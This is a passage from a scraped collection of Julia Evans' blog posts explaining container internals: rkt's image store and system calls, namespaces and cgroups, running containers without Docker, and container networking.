Y\n                     \\- shim for container Z --- process of container Z\n \n\n where  containerd  is a separate tool, and the Docker engine\ntalks to containerd but isn’t as heavily coupled to it. Right now containerd’s website\nsays it’s alpha software, but they also say on their website that it’s used in current versions of Docker, so it’s not totally obvious what the state is right now. \n\n the OCI standard \n\n We talked about how  runC  can run containers just fine, but cannot do overlay filesystems or fetch + validate containers from a registry. I would be remiss if I didn’t mention the OCID project that @grepory told me about last week, which aims to do those as separate components instead of in an integrated system like Docker. \n\n Here’s the article:  Red Hat, Google Engineers Work on a Way for Kubernetes to Run Containers Without Docker  . \n\n Today there’s  skopeo  which lets you fetch and validate images from Docker registries \n\n what we learned \n\n here’s the tl;dr: \n\n \n you can run Docker containers without Docker \n runC can run containers… but it doesn’t have overlayfs \n but overlay filesystems are important! \n rkt has overlay filesystem support. \n you need to start & supervise the containers! You can use any regular process supervisor to do that. \n also you need to tell your computers which containers to run \n software around the OCI standard is evolving but it’s not there yet \n \n\n As far as I can tell running containers without using Docker or Kubernetes or anything is\ntotally possible today, but no matter what tools you use it’s definitely not as simple as\n“just run a container”. Either way going through all these steps helps me understand what\nthe actual components of running a container are and what all these different pieces of\nsoftware are trying to do. \n\n This landscape is pretty confusing but I think it’s not impossible to understand! There\nare only a finite number of different pieces of software to figure out the role of :) \n\n If you want to see more about running containers from scratch, see  Cgroups, namespaces, and beyond: what are containers made from?  by jpetazzo. There’s a live demo of how to run a container with 0 tools (no docker, no rkt, no runC)  at this point in the video  which is super super interesting. \n\n  Thanks to Jérôme Petazzoni for answering many questions and to Kamal Marhubi for reading this. \n\n"},
{"url": "https://jvns.ca/blog/2017/07/30/a-couple-useful-ideas-from-google/", "title": "Cherry picking commits & shell scripting in golang", "content": "\n     \n\n Yesterday I was talking about Kubernetes! One interesting thing about\nworking with Kubernetes is that it forces me to think more about\nGoogle’s internal development practices. It’s originally a Google\nproject, so to contribute it, and to some extent to use it, you need to\nunderstand a little about Google software development norms. I have never\nworked at Google so I often end up asking my partner (who has) to explain\nwhat’s going on to me. \n\n I don’t think any of these are necessarily unique to Google but I think\nthey can be useful to understand when working with Google projects. \n\n cherry pick commits for bugfixes \n\n Here’s how Kubernetes release management works! (from  cherry-pick.md ) \n\n \n Start a release branch \n When there are bug fixes that are made for that release in master,\ncherry-pick them into the release branch \n that’s it! \n \n\n For example, the 1.6 release of Kubernetes came out in March,\nbut a cherry pick was merged into the release branch  on July 29  (4 months later). \n\n It seems like there are new cherry-pick commits to the 1.6 release branch\nbasically every day – there have been\n 447  commits\nsince its release, probably half of those are merge commits, so I guess about 200 changes in all. \n\n This does make me wonder a bit about the expected stability of Kubernetes\nreleases – if there are so many changes / bugfixes being made after a\nrelease comes out, maybe it makes sense to delay upgrading to a release\nuntil it’s stabilized a bit? \n\n Related to this, we’ve started building more of our software ourselves. This is\ncool because if we mostly want to be on a release (like 1.6) but have a patch\nof our own we want to apply, we can easily rebuild the project from source and\ndeploy it. \n\n write shell scripts in golang \n\n There’s a bunch of code in Kubernetes administration tooling where\nyou’re like “okay this is basically a shell script”. A good example of\nthis is  reset.go  which is like \n\n fmt.Printf(\"[reset] Unmounting mounted directories in %q\\n\", \"/var/lib/kubelet\")\numountDirsCmd := \"cat /proc/mounts | awk '{print $2}' | grep '/var/lib/kubelet' | xargs -r umount\"\numountOutputBytes, err := exec.Command(\"sh\", \"-c\", umountDirsCmd).Output()\nif err != nil {\n    fmt.Printf(\"[reset] Failed to unmount mounted directories in /var/lib/kubelet: %s\\n\", string(umountOutputBytes))\n}\n \n\n So this is literally like – you write some bash ( cat /proc/mounts | awk '{print $2}' | ... ), use  sh -c  to execute it, and embed it in a go program. \n\n I’m actually pretty into this – this script is like 180 lines of code which is quite nontrivial for a bash script. Some cool things about writing bash scripts in Go: \n\n \n you can actually have okay command line argument handling (unlike in bash where you get to write your own command line argument handling from scratch every time) \n you get a COMPILER so it can tell you if you make typos (this is such a big deal to me) \n I’d much rather have an inexperienced Go programmer contribute to a Go program than an inexperienced bash programmer contribute to a Bash script (bash is  extremely quirky  in ways that Go isn’t) \n go programs are statically compiled so if you want to use libraries in your script it’s fine! You don’t need to figure out how to distribute dependencies! (we write shell scripts in Ruby a lot and distributing the dependencies is pretty difficult/awful) \n you can’t edit the script with vim in production (you could also say this is a ‘con’ but i’m gonna go with ‘pro’ for now :)) \n \n\n This example also provides a good answer to “what if you want to use pipes in a\ngo script” which is “just run  sh -c 'thing1 | thing2 | thing3' ”. \n\n use services instead of shell scripts \n\n This one is more of an “idea that is interesting but I don’t know if it’s\nuseful to me yet”. \n\n Another interesting thing about Kubernetes is – most of it is structured as a\nset of  services  instead of a set of scripts. I think the idea is that if\nyou have a continuously running service that accepts requests, that service can\nensure the state of the system is right at all times and give you reports about\nits health (instead of having to manually trigger a rerun of the script). \n\n I was looking at the Google SRE book, and there’s this section about  automation  that talks about “service-oriented cluster turnup”. I’m not exactly sure yet how/if this relates to Kubernetes but I wanted to quote this section here: \n\n \n In the next iteration, Admin Servers became part of service teams’ workflows,\nboth as related to the machine-specific Admin Servers (for installing packages\nand rebooting) and cluster-level Admin Servers (for actions like draining or\nturning up a service). SREs moved from writing shell scripts in their home\ndirectories to building peer-reviewed RPC servers with fine-grained ACLs. \n \n\n \n\n \n Later on, after the realization that turnup processes had to be owned by the\nteams that owned the services fully sank in, we saw this as a way to approach\ncluster turnup as a Service-Oriented Architecture (SOA) problem: service owners\nwould be responsible for creating an Admin Server to handle cluster\nturnup/turndown RPCs, sent by the system that knew when clusters were ready. In\nturn, each team would provide the contract (API) that the turnup automation\nneeded, while still being free to change the underlying implementation. As a\ncluster reached “network-ready,” automation sent an RPC to each Admin Server\nthat played a part in turning up the cluster. \n \n\n This idea of “admin servers are in charge of installing packages” instead of\n“scripts are in charge of installing packages” is new to me! \n\n I’ve been doing a lot of Kubernetes cluster turnup recently, and our Kubernetes\ncluster turnup is definitely not service oriented (though we have managed to\nautomate it and I feel happy with it). In fact none of the tooling I’ve seen\nfor Kubernetes cluster setup (like kops/kubeadm) seems to be service-oriented,\nit’s all like “run kops on your laptop and hope it sets up a cluster\ncorrectly”. \n\n For now this “service oriented admin server” idea is gonna stay in the camp of\n“things I read in the Google SRE book that I don’t understand and am not going\nto try to apply”, it’s not really clear to me when it makes sense. \n\n some ideas from google are useful! \n\n I think it’s pretty important to be critical of software development practices\nthat come out of big companies like google/amazon/twitter/facebook – it’s easy\nto be like “oh, if it works for google, it must be the BEST”, but google has\nmaybe 50,000 engineers. The practices you need to work with 50,000 other\nengineers effectively don’t necessarily have any relationship to the practices\nthat work with like 20 or 100 or 200 engineers. \n\n Another reason to be critical is that Google is pretty invested in selling\ngoogle cloud products to people, and if they can convince people to adopt their\noperations practices (and software, like kubernetes!), then it makes it much\nmore natural for those people to switch to using Google-managed infrastructure. Like when I was at SRECon in March, there was a closing keynote by a Googler that basically felt like a sales pitch for GCE ( Reliability When Everything Is a Platform: Why You Need to SRE Your Customers ) \n\n But some of these things (like “write shell scripts in golang”) do seem like\ngood ideas even at a smaller scale, and I’ll always take good ideas wherever I\ncan get them :) \n\n"},
{"url": "https://jvns.ca/blog/2016/11/03/what-happens-when-you-run-a-rkt-container/", "title": "What happens when you run a rkt container?", "content": "\n     \n\n I’ve been learning a lot about  rkt  recently. rkt (“rocket”) is a program that lets you run containers. In  what even is a container? , we talked about how running a container can be “basically” just the same as running a process. You just run that process with a different view of the filesystem (using “namespaces”). \n\n I’ve claimed previously on this blog that rkt “just runs programs, it’s not\nthat complicated, that’s why it’s cool”. But if you look at the source for rkt,\nexcluding tests, there are about 34,000 lines of Go code today. That’s not a\nhuge huge project, but it’s not trivial! What are all those 34,000 lines doing? \n\n Since I’m trying to use rkt pretty seriously right now, I’d like to understand\nits architecture. Let’s find out what rkt does when it runs a container! \n\n I claimed somewhat boldly on twitter that this would “explain every system call\nthat happens in rkt”. That was somewhat of an overstatement – I picked command\nline options to rkt so that it runs as few system calls as possible, and then\neven so there are too many to understand in 2 days :) But that’s the spirit of\nwhat I’m trying to do here – really understand exactly what rkt is doing. \n\n There’s some pretty good  architecture documentation  that I referred to a bunch and explains a bunch of things that I do not explain here. \n\n As usual there are probably things in here that are wrong. \n\n What running a container looks like in rkt \n\n When you run a rkt container, it looks like this: \n\n sudo rkt run julia.com/some_image\n \n\n That looks pretty simple! But a lot of things need to happen for this to work. \n\n Part 1: FETCH \n\n To get a container, first you need to put the files on disk somewhere! This is\nactually pretty involved. \n\n Step 1.1: Look up julia.com/some_image \n\n rkt uses a container format called “ACI” today. \n\n The first thing is to download the image. You find it on the internet, download\na file, okay.  This is not trivial but it’s not what I’m interested in\nright now. Next comes the interesting (to me) part. \n\n Step 1.2: Put the image in rkt’s local container store \n\n You could imagine rkt could make your user keep those images on disk somewhere and tell you the\npath to the image to run. ( rkt run /home/julia/my-cool-image.aci ). This is not what rkt does. \n\n rkt instead maintains a store of all the images it knows about. Your image\nneeds to get into this store before it can be run. \n\n Here’s all the images I have right now on my laptop. There are 2 of them. \n\n $ sudo rkt image list\nID\t\t\tNAME\t\t\t\t\tSIZE\tIMPORT TIME\tLAST USED\nsha512-6c0b85484a1c\tcoreos.com/rkt/stage1-coreos:1.18.0\t179MiB\t1 day ago\t1 day ago\nsha512-7b1e1a77f0b6\tcoreos.com/rkt/builder:1.1.0\t\t1.6GiB\t1 day ago\t1 day ago\n \n\n Where do these images actually live on disk? In  /var/lib/rkt/cas/blob/sha512 ! \n\n  ls /var/lib/rkt/cas/blob/sha512/*\n/var/lib/rkt/cas/blob/sha512/6c:\nsha512-6c0b85484a1ca60df409e7944938fc6a44ccf4a2ce373d0557ea06ec56da73c9\n/var/lib/rkt/cas/blob/sha512/7b:\nsha512-7b1e1a77f0b693b83d87026a44d1f57b089ef392820d8b3835df292d929e8842\n \n\n The file  /var/lib/rkt/cas/blob/sha512/6c/sha512-6c0b85484a1ca60df409e7944938fc6a44ccf4a2ce373d0557ea06ec56da73c9 \nis actually a tar archive. It just contains every file that belongs in that\nimage! If you list the tar archive, you see a bunch of files like this. Neat! \n\n rootfs/usr/lib64/libc.so.6 -> libc-2.21.so\nrootfs/usr/lib64/libcap.so\nrootfs/usr/lib64/libcap.so.2 -> libcap.so.2.24\nrootfs/usr/lib64/libcap.so.2.2\n \n\n But here’s something weird: let’s compare the sizes of the images on disk, and\nhow much space rkt says our images take up. The /sha512-6c0b854 image is 843M,\nbut rkt says it’s 1.6GB! That’s almost exactly twice as much. Why? We’re going\nto find out in a second. \n\n Here’s me finding out that there’s a space mismatch: \n\n root@kiwi:/var/lib/rkt/cas/tree# du -sh /var/lib/rkt/cas/blob/sha512/*/*\n90M\t/var/lib/rkt/cas/blob/sha512/6c/sha512-6c0b85484a1ca60df409e7944938fc6a44ccf4a2ce373d0557ea06ec56da73c9\n843M\t/var/lib/rkt/cas/blob/sha512/7b/sha512-7b1e1a77f0b693b83d87026a44d1f57b089ef392820d8b3835df292d929e8842\nroot@kiwi:/var/lib/rkt/cas/tree# sudo rkt image list\nID\t\t\tNAME\t\t\t\t\tSIZE\tIMPORT TIME\tLAST USED\nsha512-6c0b85484a1c\tcoreos.com/rkt/stage1-coreos:1.18.0\t179MiB\t1 day ago\t1 day ago\nsha512-7b1e1a77f0b6\tcoreos.com/rkt/builder:1.1.0\t\t1.6GiB\t1 day ago\t1 day ag\n \n\n Step 1.3: Find the image in the local store \n\n Okay, awesome! Let’s suppose the image is already in the local store. We need\nto look it up. \n\n So if I’m doing  rkt run core.com/rkt/builder  I’ll find that image at\n /var/lib/rkt/cas/blob/sha512/7b/sha512-7b1e1a77f0b693b83d87026a44d1f57b089ef392820d8b3835df292d929e8842 .\nBut how does rkt know that that image name matches that tar file? \n\n If I strace rkt, I see it reading a file called  /var/lib/rkt/cas/db/ql.db .\nWhat’s that? It turns out “ql” is an embedded SQL database written in Go. Let’s\nsee what’s in it! There are 3 tables (‘remote’, ‘aciinfo’, and ‘version’).\naciinfo seems to be the only really interesting one. \n\n $ ql  -db /var/lib/rkt/cas/db/ql.db 'select * from aciinfo'\n\"sha512-7b1e1a77f0b693b83d87026a44d1f57b089ef392820d8b3835df292d929e8842\", \"coreos.com/rkt/builder\", 2016-10-28 23:59:50.357354868 -0400 EDT, 2016-10-28 23:59:54.158511535 -0400 EDT, false, 883696128, 864451348\n\"sha512-6c0b85484a1ca60df409e7944938fc6a44ccf4a2ce373d0557ea06ec56da73c9\", \"coreos.com/rkt/stage1-coreos\", 2016-10-28 23:56:30.485120722 -0400 EDT, 2016-10-28 23:56:30.950583566 -0400 EDT, false, 93723136, 93603074\n \n\n Okay, so we can look up the image by name in the SQL database and find out where it’s supposed to be on disk. Great! What now? \n\n Step 1.4: copy everything from the “image store” to the “tree store” \n\n So, you might think that we use the image store to run containers (from /var/lib/rkt/cas/blob). This is how Docker works – it just stores a bunch of images on disk and uses them directly to run containers. rkt has an EXTRA STEP, though. So before you can run your container, it \n\n 1) finds all your container’s dependencies\n2) unzips every dependency into a single directory all on top of each other\n3) calls that the “tree store” \n\n If you think this takes extra disk space, you are right! When you use rkt to run a container you get 2 copies of every file in that container. I was confused about this so I asked on the mailing list why it is (which delayed me making progress on this post for several).  Here is the question I asked \n\n I’m going to copy the relevant part of the reply here because it was VERY HELPFUL. \n\n \n One of the key differences between the ACI and Docker formats is that while Docker’s layers are essentially a linked list, ACI dependencies instead form a directed acyclic graph, with a separate whitelist system. This means that to create a root filesystem from a Docker image and its parent layers, you can simply layer them on top of each other while respecting the AUFS-style whiteout files; whereas the process of rendering an ACI as a root filesystem is rather more complicated [1], as you need to traverse a full graph [2], and can have cases like the same image appearing multiple times in the graph but with a different whitelist affecting which parts of it should be used [3]. To compensate for this additional complexity, we “pre-render” the root filesystem that an ACI represents into the treestore [4], and then use overlayfs on top of this at runtime. \n \n\n So basically this is because of a fundamental difference between the ACI format and the Docker image format. But the new OCI format is more like the Docker format! And they’re rearchitecting how they do all their container storage on disk. So this might all be completely different in the future. Let’s move along. \n\n Part 2: PREPARE TO RUNNNN \n\n Before we run, we have to PREPARE to run. \n\n Step 2.1: Create a pod \n\n So when you run a rkt container, you’re actually running a thing called a “pod”. I am still somewhat confused about what running a pod entails exactly but I know that \n\n 1) you get a pod ID like 9ec8ec92-f04d-4194-956f-2aa1fe94389c\n2) pods do not get automatically deleted when your program exits (they need to be garbage collected)\n3) you can run “rkt prepare” to prepare a pod to run and then  rkt run-prepared  to run an already set-up pod \n\n Step 2.2: mount the pod’s filesystems \n\n To run a program, the pod needs files! The files that the pod is going to run are in the “tree store”. Here’s a system call from rkt setting up the pod’s filesystems: \n\n 32034 mount(\"overlay\",\n\"/var/lib/rkt/pods/run/9ec8ec92-f04d-4194-956f-2aa1fe94389c/stage1/rootfs\",\n\"overlay\", 0,\n\"lowerdir=/var/lib/rkt/cas/tree/deps-sha512-7d429fe0c72eb12b91726bde7ff2b730b4b72c1c380a4ea5d09ff162b086cb49/rootfs,upperdir=/var/lib/rkt/pods/run/9ec8ec92-f04d-4194-956f-2aa1fe94389c/overlay/deps-sha512-7d429fe0c72eb12b91726bde7ff2b730b4b72c1c380a4ea5d09ff162b086cb49/upper,workdir=/var/lib/rkt/pods/run/9ec8ec92-f04d-4194-956f-2aa1fe94389c/overlay/deps-sha512-7d429fe0c72eb12b91726bde7ff2b730b4b72c1c380a4ea5d09ff162b086cb49/work\")\n= 0b12b91726bde7ff2b730b4b72c1c380a4ea5d09ff162b086cb49\n \n\n Goodness. This basically says “take  /var/lib/rkt/cas/tree/deps-sha512-7d429fe0c72e...  and  /var/lib/rkt/pods/run/9ec8ec92-f04d-4194-956f-2aa1fe94389c/overlay/deps-sha512-7d429fe0c72eb12b91726bde7ff2b730b4b72c1c380a4ea5d09ff162b086cb49/upper  and put them together to make  /var/lib/rkt/pods/run/9ec8ec9.../stage1/rootfs ”. \n\n This is called an “overlay filesystem” and it is a big part of how containers work. Basically if you want to run 3 programs on the same computer with the same base container, you can! And they can share files on disk! But that doesn’t mean they share files with each other – if one program edits a file from the base container, the other programs won’t see the changes. Instead they all get their own filesystems, which use copy-on-write. \n\n Part 3: RUN!!!!!!!!!! \n\n The last thing we get to do is RUN THE CONTAINER. We’re going to go through a\nbunch of system calls now! Here’s how I ran  rkt run , with some commentary\nabout why I picked that option. Basically I picked options that would run my\ncontainer in the simplest way possible. Simplest does not mean best – the simplest way\nincludes turning off all security features :) \n\n rkt run \n   coreos.com/rkt/builder\n  # security features are complicated! turn them all off\n  --insecure-options=all\n  # no network namespaces, just do the most boring possible networking\n  --net=host\n  # use the \"fly\" stage1 -- this will just run my container using a chroot\n  # (network namespaces don't even work with this anyway, the --net=host is kinda redundant)\n  --stage1-name=coreos.com/rkt/stage1-fly:1\n  # set up a couple of volumes that this particular container wants\n  --volume src-dir,kind=host,source=(pwd)\n  --volume build-dir,kind=host,source=(pwd)/build\n \n\n Okay, what happens when we do this? We’ve already set up our pod (in the PREPARE step). Here’s the first interesting thing I saw. \n\n /var/lib/rkt/pods/run/10a558fc-f917-443a-ad23-b54a7c5ce95d/stage1/rootfs/run\n \n\n It is running our program! It then goes and does a bunch of boring stuff where\nit sets up /proc or whatever. This is pretty annoying to read because this\nprogram is a Go program so there are a lot of weird Go runtime system calls\nbecause it runs one thread per core or something. \n\n Also it reads the pod manifest and figures out what its job is (what program is\nit supposed to run). \n\n This container’s job is to run a file called  /scripts/build.sh . It finally does\nit! Here’s what that looks like: \n\n 30297 chroot(\"stage1/rootfs/opt/stage2/builder/rootfs\") = 0\n30297 chdir(\"/opt/rkt\")                 = 0\n30297 setresgid(0, 0, 0)                = 0\n30297 setresuid(0, 0, 0)                = 0\n30297 fcntl(4, F_SETFD, 0)              = 0\n30297 execve(\"/bin/bash\", [\"/bin/bash\", \"/scripts/build.sh\"], [/* 5 vars */] <unfinished ...>\n \n\n We did it! We ran a container! \n\n what is this “stage1” business, julia? \n\n Yeah, sorry, this is a weird rkt thing. BASICALLY there is a set of programs\ncalled “stage1” which get included in your filesystem. Their job is to take\nyour “container manifest”  (which says what program to run) and the rkt command\nline arguments (like which ports to map to which other ports) and make it all\nhappen for you. So they’re basically responsible for setting up the actual\ncontainer. \n\n As far as I understand there are basically only 2 interesting ones: the regular\none (which uses systemd) and the lightweight one (“fly”). I picked the\nlightweight one here because the other one has way more system calls and it’s\nmore complicated to understand. \n\n Step ???: A lot of security checks \n\n One thing I’ve intentionally left out here is – rkt does a ton of security checks when you run a container. They’re called “image”, “tls”, “ondisk”, “http”, “pubkey”, “capabilities”, “paths”, and “seccomp”. You might have noticed that I ran with  --insecure-options=all . This is not what I do in real life, but it is a lot to talk about and this is already getting to be 2000 words. \n\n Some of them are during fetch (which you can separate out and do before running the container) and some of them are during run. So it might be reasonable to ignore all the  fetch  security checks if you already did them all when fetching. Who knows. I’m not going to give you security recommendations, you should not listen to me. \n\n Understanding the systems you are using is cool \n\n Someone on twitter asked me “julia, why are you asking all these questions,\nthis is not the level of abstraction you should work at, you need to ship\ncode!” \n\n And this is sort of true! Everyone should not need to know all the details of\nhow everything they use works. That would take too much time. Imagine if every\nLinux user needed to read Linux kernel code to do their job! Eep. \n\n HOWEVER. Right now it is my job to work on making sure containers will work, so\nthat other people do not have to worry about it! This means that I have to (get\nto?) worry about some of the weird stuff my container software is doing. \n\n If I know rkt’s storage model, then I can make guesses at exactly how much disk\nspace rkt is going to use in production, then I can plan to give my machines an\nappropriate amount of storage, and then nobody will run out of disk space!\nRunning out of disk space is THE WORST. \n\n This is why I appreciate documents like Kelsey Hightower’s  Kubernetes the Hard Way  – when you\nwork with complex systems, a lot of the time  someone  needs to understand\nhow they work, so they can plan to operate the system correctly. \n\n Right now I get to be that someone, for some things. Yay! \n\n"},
{"url": "https://jvns.ca/blog/2016/10/10/what-even-is-a-container/", "title": "What even is a container: namespaces and cgroups", "content": "\n     \n\n The first time I heard about containers it was like – what? what’s that? \n\n Is a container a process? What’s Docker? Are containers Docker? Help! \n\n The word “container” doesn’t mean anything super precise. Basically there are a few new  Linux kernel features (“namespaces” and “cgroups”) that let you isolate processes from each other. When you use those features, you call it “containers”. \n\n Basically these features let you pretend you have something like a virtual machine, except it’s not a virtual machine at all, it’s just processes running in the same Linux kernel. Let’s dive in! \n\n namespaces \n\n Okay, so let’s say we wanted to have something like a virtual machine. One feature you\nmight want is – my processes should be separated from the other processes on the\ncomputer, right? \n\n One feature Linux provides here is  namespaces . There are a bunch of different kinds: \n\n \n in a  pid  namespace you become PID 1 and then your children are other processes. All the other programs are gone \n in a  networking namespace  you can run programs on any port you want without it conflicting with what’s already running \n in a  mount namespace  you can mount and unmount filesystems without it affecting the host filesystem. So you can have a totally different set of devices mounted (usually less) \n \n\n It turns out that making namespaces is totally easy! You can just run a program called  unshare  (named after the system call of the same name) \n\n Let’s make a new PID namespace and run bash in it! \n\n $ sudo unshare --fork --pid --mount-proc bash\n \n\n What’s going on? \n\n root@kiwi:~# ps aux\nUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.0  28372  4148 pts/6    S    23:01   0:00 bash\nroot         2  0.0  0.0  44432  3836 pts/6    R+   23:01   0:00 ps aux\n \n\n Wow, we’re in a whole new world! There are only 2 processes running – bash and ps. Cool, that was easy! \n\n It’s worth noting that if I look from my regular PID namespaces, I can see the processes in the new PID namespace: \n\n root     14121  0.0  0.0  33264  4044 pts/6    S+   23:09   0:00 htop\n \n\n This process 14121 (regular namespace) is process 3 in my new PID namespace. So they’re two views on the same thing, but one is a lot more restricted. \n\n entering the namespace of another program \n\n Also you can enter the namespace of another running program! You do this with a command called  nsenter . I think this is how  docker exec  works? Maybe? \n\n cgroups: resource limits \n\n Okay, so we’ve made a new magical world with new processes and sockets that is separate from our old world. Cool! \n\n What if I want to limit how much memory or CPU one of my programs is using? WE’RE IN LUCK. In 2007 some people developed  cgroups  just for us. These are like when you  nice  a process but with a bunch more features. \n\n Let’s make a cgroup! We’ll make one that just limits memory \n\n $ sudo cgcreate -a bork -g memory:mycoolgrou\n \n\n Let’s see what’s in it! \n\n $ ls -l /sys/fs/cgroup/memory/mycoolgroup/\n-rw-r--r-- 1 bork root 0 Okt 10 23:16 memory.kmem.limit_in_bytes\n-rw-r--r-- 1 bork root 0 Okt 10 23:14 memory.kmem.max_usage_in_bytes\n \n\n ooh, max usage in bytes! Okay, let’s try that! 10 megabytes should be enough for anyone! \n\n $ sudo echo 10000000 >  /sys/fs/cgroup/memory/mycoolgroup/memory.limit_in_bytes\n \n\n Awesome, let’s try using my cgroup! \n\n $ sudo cgexec  -g memory:mycoolgroup bash\n \n\n I ran a bunch of commands. they worked fine. Then I tried compiling a Rust program :) :) :) \n\n $ root@kiwi:~/work/ruby-stacktrace# cargo build\nerror: Could not execute process `rustc -vV` (never executed)\n\nCaused by:\n  Cannot allocate memory (os error 12)\n \n\n Fantastic! We have successfully limited our program’s memory! \n\n seccomp-bpf \n\n Okay, one last feature! If you’re isolating your processes, you might in addition to restricting their memory and CPU usage, want to restrict what system calls they can run! Like, “no network access for you!”.  That might help with security! We like security. \n\n This brings us to  seccomp-bpf , a Linux kernel feature that lets you filter which system calls your process can run. \n\n what are containers? \n\n Okay, now that you’ve seen these two features you might think “wow, yeah, I could build a bunch of scripts around all these features and have something really cool!” It would be really lightweight and my processes would be isolated from each other, and, wow! \n\n Some people thought that in the past too! They built a thing called “Docker containers” that uses these features :). That’s all Docker is! Of course Docker has a lot of features these days, but a lot of it is built on these basic Linux kernel primitives. \n\n learn more in “How Containers Work” \n\n In 2020, I published a whole zine about containers called “How containers\nwork”. You can  get it here for $12 . \n\n Here’s the cover and table of contents: \n\n \n \n \n \n\n"},
{"url": "https://jvns.ca/blog/2016/10/26/running-container-without-docker/", "title": "Running containers without Docker", "content": "\n     \n\n Right now at work, my team’s job is basically to be Heroku for the rest of the\ncompany – we want it to be really easy for developers to run and operate code\non our servers. \n\n I’m not going to talk right now about why “make it easier for developers to\nrun code on our servers” might involve “containers”, because that’s a whole other\npost. Let’s suppose we believe that. \n\n So if you have a bunch of existing infrastructure that you maybe want to move\nto containers, what’s the migration plan? How do you get from here to there? \n\n I was having trouble coming up with a migration plan that made sense to me,\nbut with the help of some delightful coworkers now I have one  that I think\nmakes sense! This post makes an argument for that migration plan! Here’s the\ntl;dr: (as usual everything that is wrong in this post is my responsibility\n:)) \n\n \n You can run containers without using Docker or Kubernetes or Mesos or anything like that \n Running containers has a bunch of advantages even with no Docker \n If you’re going to move to Docker/k8s eventually, you need to containerize  anyway . You can separate out this work into a smaller project! \n so this might be a good migration plan if you want to eventually move to Kubernetes or something \n \n\n As usual I am not a container expert. I am just trying to figure out how to\nuse them. Maybe this will be useful to you too! I’m writing this because I\nthink having more ideas for migration plans on the internet to think about and\ncompare is a good thing. \n\n vertical change vs horizontal change \n\n If you’re trying to make a big infrastructure change (like migrate to\nKubernetes), there are basically two ways to do it. You could make a new small\nKubernetes cluster which contains all your hopes and dreams, and slowly\nmigrate things into the new cluster. \n\n The second way is to incrementally roll out small changes. So you start out\nmaking a bunch of changes horizontally across your infrastructure, and move\neverything a little towards Kubernetes, and a little more, and a little more,\nand a little more, and then finally hopefully you have what you want. \n\n Right now making changes horizontally feels less risky to me, because it means\nyou can check that your changes will actually work everywhere and there’s less\ndanger of “we have this cool new world but a bunch of our software can’t\nactually use any of it right now”. \n\n But there are also good things about building the Cool New World first! You can\nstart to learn how to operate your Cool New World by deploying less critical\napplications there. \n\n what does “use containers without Docker” mean (and why you might want to start without Docker) \n\n I mean a pretty specific thing by “just use containers”. We learned  a while back  that Docker has a daemon. This daemon does a  bunch  of stuff for you, like \n\n \n supervising your containers and restarting them when they stop \n redirecting your programs’ logs \n letting you run commands like  docker ps  to see what you have running on the box \n I don’t even know what else \n \n\n Lots of cool orchestration features like with Kubernetes or Mesos or Docker\nSwarm mean that I need to learn how the software works and how it operates and\nexactly how it can fail in production. Which I am okay with doing, eventually!\nBut in the short term, if I want to deploy changes that I can confidently run in\nproduction, using all kinds of exciting features like this just slows me down. \n\n So, what’s the minimal way to use containers, where you use as few features as\npossible but still get some advantages? \n\n Right now I think it’s: \n\n \n build a container image. Use whatever you want to do this (a Dockerfile,  packer , whatever). You can use as many fancy tools as you want to build your containers. \n run that container with  rkt . rkt just runs containers, the same way you run a program. I know how to run programs! This is awesome. \n run the container in your host network namespace (same place as before) so you don’t need to worry about any fancy networking business \n supervise it the same way you supervise things currently \n run the container in its own pid namespace \n \n\n And rkt is mostly just responsible for starting up my process in a reasonable\nenvironment and passing on any signals it gets to my process. It seems like it\nwould be hard to screw that up too much. (though, as usual with software, who\nknows what will happen until you try) \n\n rkt actually does a bit more than I’ve described – it keeps a local store of\ncontainers on your machine, it does a bunch of security checks at runtime, and\nit runs systemd as an init process inside your container. There’s probably more\nthat I don’t understand yet, too. \n\n what just containers can do for me \n\n Three things I would really like: \n\n \n have less lines of puppet configuration that I am scared of changing \n stop thinking in terms of how to provision specific computers (“I need to put this file at /etc/awesome/blah.xml on this computer”), and worry more about services (“this program always needs /etc/awesome/blah.xml to exist”) \n have better standards around how we run services (less special snowflakes) \n \n\n I think that just using containers by itself will force us to be disciplined\nabout how we package and run services (you have to install all the stuff the\nservice needs inside the container, otherwise the service will not work!). \n\n There’s no way for it to silently depend on the host configuration, because\nits filesystem is totally separate from the host’s filesystem. \n\n To get these advantages, you don’t need to run Docker or Kubernetes or Mesos\nor anything! You just need to have a container that is isolated from the rest\nof your operating system. \n\n To be clear, I don’t necessarily think it makes sense to stop at “just use\ncontainers”. This is just about separating work into smaller useful chunks. \n\n migrating to using containers without docker might be really easy! \n\n The exciting thing to me about “use containers without docker” is that I don’t\nneed to learn how to operate any new programs in production. I’m hoping that\nif we do this, we can get it done pretty quickly, and then move on to the\nbusiness of deciding how to manage the containers. \n\n And you’ll have to do all this “make your programs work with containers” work\nanyway to use  any  containerization magic! So you’re just doing work that\nyou’d have to do anyway. \n\n cautiously optimistic \n\n I used to be really annoyed about containers because it seemed like a\nbuzzword. But it seems like right now a lot of the thinking & software being\nbuilt around “make it easy for developers to run code” is happening in the\ncontext of containers. So it seems like it’s worth it for me to learn what’s\nhappening in containerland! \n\n So I’m going to try this stuff out, but I think we’re going to start slowly and\nintroduce as little new software into our production environments at a time as\nI can :) \n\n thanks to Kamal for reading this and being the best. Also to\n Greg  my coworker who is the best for telling me\nmany things about containers. \n\n"},
{"url": "https://jvns.ca/blog/2016/12/22/container-networking/", "title": "A container networking overview", "content": "\n     \n\n I’ve been talking about container things a bunch on this blog, mostly\nbecause I’ve been looking at them at work. \n\n One of the hardest things to understand about all this newfangled\ncontainer stuff is – what is even going  on  with the networking?! \n\n There are a lot of different ways you can network containers together,\nand the documentation on the internet about how it works is often pretty bad. I\ngot really confused about all of this, so I’m going to try to explain what it\nall is in laymen’s terms. \n\n (I don’t like to rant here, but I really have been frustrated with the state of\nthe documentation on this networking stuff.) \n\n what even is container networking? \n\n When you run a program in a container, you have two main options: \n\n \n run the program in the host network namespace. This is normal networking – if you run a program on port 8282, it will run on port 8282 on the computer. No surprises. \n run the program in its  own  network namespace \n \n\n If you have a program running in its own network namespace (let’s say on port\n9382), other programs on other computers need to be able to make\nnetwork connections to that program. \n\n At first I thought “how complicated can that be? connecting\nprograms together is simple, right?” Like, there’s probably only one way to do\nit? It turns out that this problem of how to connect two programs in containers\ntogether has a ton of different solutions. Let’s learn what those solutions\nare! \n\n “every container gets an IP” \n\n If you are a container nerd these days, you have probably heard of\n Kubernetes . Kubernetes is a system that will take a container and\nautomatically decide which computer your container should run on. (among\nother things) \n\n One of Kubernetes’ core requirements (for you to even start using it) is\nthat  every  container has to have an IP address, and that any other\nprogram inside you cluster can talk to your container  just using that\nIP address . So this 